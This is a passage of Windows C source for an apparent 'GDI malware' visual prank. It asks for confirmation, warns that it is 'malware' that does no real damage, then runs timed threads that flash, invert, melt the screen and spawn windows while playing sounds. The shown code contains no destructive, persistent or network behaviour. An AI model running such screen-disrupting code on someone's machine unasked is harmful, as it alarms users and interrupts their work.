			BitBlt(hdcTemp, x + dx, y + dy, w - x, h - y, hdcTemp, x, y, NOTSRCCOPY);
		}
		BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, SRCAND);
		BitBlt(hdc, 0, 0, w, h, hdcTemp, 0, 0, 0x00CC0020);
		SelectObject(hdcTemp, hbmOld);
		DeleteDC(hdcTemp);
		DeleteObject(hbm);
		ReleaseDC(NULL, hdc);
	}
}

int main() {
	if (MessageBoxA(NULL, "Are you sure you want to run this malware? This will not cause any real damage. This is your only warning.", "WARNING", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
		ExitProcess(0);
	} else {
		HANDLE thread0 = CreateThread(NULL, 0, lines, NULL, 0, NULL);
		HANDLE thread1 = CreateThread(NULL, 0, circles, NULL, 0, NULL);
		HANDLE thread2 = CreateThread(NULL, 0, icons, NULL, 0, NULL);
		sound1();
		Sleep(15000);
		TerminateThread(thread0, 0);
		TerminateThread(thread1, 0);
		TerminateThread(thread2, 0);
		CloseHandle(thread0);
		CloseHandle(thread1);
		CloseHandle(thread2);
		HANDLE thread3 = CreateThread(NULL, 0, colorSpam, NULL, 0, NULL);
		HANDLE thread4 = CreateThread(NULL, 0, polygons, NULL, 0, NULL);
		sound2();
		Sleep(15000);
		TerminateThread(thread3, 0);
		TerminateThread(thread4, 0);
		CloseHandle(thread3);
		CloseHandle(thread4);
		HANDLE thread5 = CreateThread(NULL, 0, ropOperations, NULL, 0, NULL);
		sound3();
		Sleep(15000);
		TerminateThread(thread5, 0);
		CloseHandle(thread5);
		HANDLE thread6 = CreateThread(NULL, 0, spamWindows, NULL, 0, NULL);
		HANDLE thread7 = CreateThread(NULL, 0, rgbSpin, NULL, 0, NULL);
		sound4();
		Sleep(15000);
		TerminateThread(thread6, 0);
		TerminateThread(thread7, 0);
		CloseHandle(thread6);
		CloseHandle(thread7);
		HANDLE thread8 = CreateThread(NULL, 0, colors1, NULL, 0, NULL);
		sound5();
		Sleep(5000);
		TerminateThread(thread8, 0);
		CloseHandle(thread8);
		HANDLE thread9 = CreateThread(NULL, 0, colors2, NULL, 0, NULL);
		sound5();
		Sleep(5000);
		TerminateThread(thread9, 0);
		CloseHandle(thread9);
		HANDLE thread10 = CreateThread(NULL, 0, colors3, NULL, 0, NULL);
		sound5();
		Sleep(5000);
		TerminateThread(thread10, 0);
		CloseHandle(thread10);
		HANDLE thread11 = CreateThread(NULL, 0, final1, NULL, 0, NULL);
		HANDLE thread12 = CreateThread(NULL, 0, final2, NULL, 0, NULL);
		HANDLE thread13 = CreateThread(NULL, 0, final3, NULL, 0, NULL);
		HANDLE thread14 = CreateThread(NULL, 0, final4, NULL, 0, NULL);
		HANDLE thread15 = CreateThread(NULL, 0, melt, NULL, 0, NULL);
		sound6();
		Sleep(15000);
		TerminateThread(thread11, 0);
		TerminateThread(thread12, 0);
		TerminateThread(thread13, 0);
		TerminateThread(thread14, 0);
		TerminateThread(thread15, 0);
		CloseHandle(thread11);
		CloseHandle(thread12);
		CloseHandle(thread13);
		CloseHandle(thread14);
		CloseHandle(thread15);
	}
	return 0;
}